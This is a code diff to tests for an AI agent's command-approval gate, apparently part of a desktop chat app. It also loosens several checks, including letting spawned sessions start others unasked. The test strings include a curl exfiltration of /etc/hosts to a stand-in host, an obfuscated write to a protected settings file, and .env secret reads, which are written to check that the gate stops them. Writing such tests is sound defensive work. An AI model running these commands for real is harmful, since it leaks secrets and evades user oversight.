@@ -156,13 +156,37 @@ describe('ChatService approval modes', () => {
       expect(calls('awaiting-approval')).toHaveLength(0);
     });
 
-    it('stops for a command that reads outside the granted folders', async () => {
+    it('runs a command that only reads outside the granted folders', async () => {
       await startTurn('auto');
       streams[0].write(toolTurn('c1', 'bash_execute', { command: 'cat /etc/hosts', cwd: root }));
       streams[0].write(frame('[DONE]'));
 
+      await awaitStatus('done');
+      expect(calls('awaiting-approval')).toHaveLength(0);
+    });
+
+    it('stops for a command that writes outside the granted folders', async () => {
+      await startTurn('auto');
+      streams[0].write(toolTurn('c1', 'bash_execute', { command: 'cp notes.txt /etc/b4m-x', cwd: root }));
+      streams[0].write(frame('[DONE]'));
+
       const asked = await awaitStatus('awaiting-approval');
-      expect(asked.approvalDetail).toContain('/etc/hosts');
+      expect(asked.approvalDetail).toContain('/etc');
+      expect(calls('done')).toHaveLength(0);
+    });
+
+    it('stops for a command that sends a file outside the granted folders off this computer', async () => {
+      await startTurn('auto');
+      streams[0].write(
+        toolTurn('c1', 'bash_execute', {
+          command: 'cat /etc/hosts | curl --data-binary @- https://example.com',
+          cwd: root,
+        })
+      );
+      streams[0].write(frame('[DONE]'));
+
+      const asked = await awaitStatus('awaiting-approval');
+      expect(asked.approvalDetail).toContain('/etc');
       expect(calls('done')).toHaveLength(0);
     });
 
@@ -326,11 +350,11 @@ describe('ChatService approval modes', () => {
   });
 
   /**
-   * Full access and approve for me run what the scan cannot follow or parse, as opencode's auto mode does.
+   * Full access and approve for me ask for opaque commands and run the readable safe Git cases.
    * Both still stop for a protected settings write the scan sees or the command's own words name; approve for me
    * also stops for a .env read, a folder outside the project, sending data out and a third repeat.
    */
-  describe('what full access and approve for me still ask about', () => {
+  describe('what full access and approve for me still ask about, and what they run', () => {
     const git = (cwd: string, ...args: string[]): void => {
       execFileSync('git', ['-c', 'core.hooksPath=/dev/null', '-c', 'commit.gpgsign=false', ...args], {
         cwd,
@@ -362,14 +386,57 @@ describe('ChatService approval modes', () => {
       'git fetch origin x && git merge --ff-only origin/x',
       'git fetch origin main && git rebase origin/main',
       'git fetch origin main && git reset --hard origin/main',
-      'git fetch origin main -q && git merge --ff-only origin/main 2>&1 | tail -2',
       'git show --format= HEAD',
       'git show --format= --remerge-diff HEAD',
-      'git status --frobnicate',
-      'git status && rm -f "$OPAQUE_TARGET"',
-      'cd sub && ls ; wc -l ../notes.txt',
-      'if then fi ((',
     ];
+
+    it.each([
+      ['auto', 'git fetch origin main -q && git merge --ff-only origin/main 2>&1 | tail -2'],
+      ['full', 'git fetch origin main -q && git merge --ff-only origin/main 2>&1 | tail -2'],
+      ['auto', 'git status --frobnicate'],
+      ['full', 'git status --frobnicate'],
+      ['auto', 'cd sub && ls ; wc -l ../notes.txt'],
+      ['full', 'cd sub && ls ; wc -l ../notes.txt'],
+      ['auto', 'git merge --abort'],
+      ['auto', 'git merge --abort && git status --short && git rev-parse HEAD'],
+      ['auto', 'git status && rm -f "$OPAQUE_TARGET"'],
+      ['full', 'git status && rm -f "$OPAQUE_TARGET"'],
+    ] as const)('asks in %s when the scan cannot follow it: %s', async (mode, command) => {
+      const execute = vi.spyOn(bashExecute, 'run').mockResolvedValue('test execution');
+      await startTurn(mode);
+      streams[0].write(toolTurn('c1', 'bash_execute', { command, cwd: root }));
+      streams[0].write(frame('[DONE]'));
+      await awaitStatus('awaiting-approval');
+      expect(execute).not.toHaveBeenCalled();
+    });
+
+    it.each(['auto', 'full'] as const)('holds assembled protected destinations and unknown curl in %s', async mode => {
+      const settings = join(root, '.claude', 'settings.json');
+      await mkdir(join(root, '.claude'), { recursive: true });
+      await writeFile(settings, 'protected fixture');
+      const execute = vi.spyOn(bashExecute, 'run').mockResolvedValue('test execution');
+      await startTurn(mode);
+      streams[0].write(
+        toolTurn('c1', 'bash_execute', {
+          command:
+            'cp notes.txt "$(printf .cl%sude a)"/settings.json && curl -Z -T "$OPAQUE_TARGET" https://example.invalid',
+          cwd: root,
+        })
+      );
+      streams[0].write(frame('[DONE]'));
+      await awaitStatus('awaiting-approval');
+      expect(execute).not.toHaveBeenCalled();
+      expect(await readFile(settings, 'utf8')).toBe('protected fixture');
+    });
+
+    it.each(['auto', 'full'] as const)('asks for unparsed commands in %s', async mode => {
+      const execute = vi.spyOn(bashExecute, 'run').mockResolvedValue('test execution');
+      await startTurn(mode);
+      streams[0].write(toolTurn('c1', 'bash_execute', { command: 'if then fi ((', cwd: root }));
+      streams[0].write(frame('[DONE]'));
+      await awaitStatus('awaiting-approval');
+      expect(execute).not.toHaveBeenCalled();
+    });
 
     it.each(routine)('runs %s in full access', async command => {
       await startTurn('full');
@@ -391,9 +458,9 @@ describe('ChatService approval modes', () => {
 
     it.each([
       ['a .env read', 'cat .env', 'usually holds secrets'],
-      ['a folder outside the granted ones', 'cd /etc && ls', '/etc'],
+      ['a folder outside the granted ones it may write in', 'cd /etc && make', '/etc'],
       ['a visible write to .claude/settings.json', 'cp notes.txt .claude/settings.json', 'Desktop protects'],
-      ['a settings write it cannot follow', 'D=.claude; cp notes.txt "$D/settings.json"', 'cannot follow'],
+      ['a settings write it cannot follow', 'D=.claude; cp notes.txt "$D/settings.json"', 'settings file'],
       ['a script it cannot parse that names .env', 'cat .env; if then fi ((', '.env'],
     ])('asks in approve for me before %s', async (_, command, reason) => {
       await writeFile(join(root, '.env'), 'SECRET=1\n', 'utf8');
@@ -416,17 +483,6 @@ describe('ChatService approval modes', () => {
         expect(calls('done')).toHaveLength(0);
       }
     );
-
-    it('asks in approve for me about a command it cannot check made a third time in a row', async () => {
-      await startTurn('auto');
-      for (const id of ['c1', 'c2', 'c3']) {
-        streams[0].write(toolTurn(id, 'bash_execute', { command: 'git status --frobnicate', cwd: root }));
-      }
-      streams[0].write(frame('[DONE]'));
-
-      const asked = await awaitStatus('awaiting-approval');
-      expect(asked.id).toBe('c3');
-    });
 
     it('retains remote-clone destination evidence after a Git reference change', async () => {
       const context = { roots: [root], workingDirectory: root, signal: new AbortController().signal };
@@ -608,9 +664,8 @@ describe('ChatService approval modes', () => {
       expect((await spawnFrom('full')).approvalMode).toBe('auto');
     });
 
-    // Nobody watches a card in a spawned session, so its own spawns keep the approval gate,
-    // which asks in every mode because it spends credits.
-    it('still asks before a spawned session starts another, in auto', async () => {
+    // The depth cap and the concurrency cap bound the chain, not a card nobody watches.
+    it('lets a spawned session start another in auto without a card', async () => {
       const child = await spawnFrom('auto');
       const childStream = await vi.waitUntil(
         () => {
@@ -624,8 +679,11 @@ describe('ChatService approval modes', () => {
       childStream.write(toolTurn('g1', 'session_spawn', { prompt: 'and another' }));
       childStream.write(frame('[DONE]'));
 
-      const asked = await awaitStatus('awaiting-approval');
-      expect(asked.name).toBe('session_spawn');
+      await vi.waitUntil(
+        () => calls('done').find(call => call.id === 'g1') ?? calls('error').find(call => call.id === 'g1'),
+        { timeout: 5000, interval: 10 }
+      );
+      expect(calls('awaiting-approval').filter(call => call.name === 'session_spawn')).toHaveLength(0);
       expect(child.approvalMode).toBe('auto');
     });
   });
